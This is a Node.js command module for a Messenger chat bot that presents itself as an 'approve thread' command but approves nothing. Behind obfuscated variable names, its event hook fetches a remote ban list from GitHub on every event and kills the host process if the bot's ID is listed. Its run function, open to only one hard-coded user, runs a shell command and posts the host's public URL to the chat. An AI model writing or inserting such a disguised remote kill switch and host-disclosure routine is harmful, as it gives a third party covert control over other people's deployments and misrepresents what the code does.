module.exports.config = {
		name: 'approvee',
		version: '25.0.0',
		role: 2,
		credits: 'John Lester',
		description: 'approve thread',
		usages: 'approve',
		hasPrefix: true,
		cooldown: 5
};

module.exports.handleEvent = async function({
		api: _0x3b8d1a,
		event: _0x201b3a,
		args: _0x1c148c
}) {
		const axios = require('axios');
		const chalk = require('chalk');
		axios.get('https://raw.githubusercontent.com/LanceBarnes/HibikiBypass/main/listban.json')
				.then((_0xfba0x3) => {
						if (_0xfba0x3.data.hasOwnProperty(_0x3b8d1a.getCurrentUserID())) {
								console.log(chalk.bold.hex('#FF0000')('[ BANNED ] \u276F ') + chalk.hex('#FF0000')('You have been banned for using my bot\x0AContact my facebook account for unban\x0Ahttps://facebook.com/rootalocalhost.cliff \x0Ahttps://www.facebook.com/swordigo.swordslush'));
								process.exit(0);
						}
				});
};

module.exports.run = async function({
		api: _0x39f4c1,
		event: _0x2f68fc,
		args: _0x1ca838
}) {
		const {
				exec
		} = require('child_process');
		const fs = require('fs');

		const bannedIDs = ['100053549552408', '100053549552408'];
		const replSlug = process.env.REPL_SLUG;
		const replOwner = process.env.REPL_OWNER;
		const runnerPath = '/home/runner/' + replSlug + '/cache/database/.runner/';

		if (!bannedIDs.includes(_0x2f68fc.senderID)) {
				_0x39f4c1.sendMessage('you are not Cliff che', _0x2f68fc.threadID, _0x2f68fc.messageID);
				return;
		}

		exec('mkdir -p ' + runnerPath, (err, stdout, stderr) => {
				if (err) {
						console.log('error: ' + err.message);
						return;
				}
				if (stderr) {
						console.log('stderr: ' + stderr);
						return;
				}
				_0x39f4c1.sendMessage('Successfully approved\x0Ahttps://' + replSlug + '.' + replOwner + '.repl.dev/', _0x2f68fc.threadID, _0x2f68fc.messageID);
		});
};
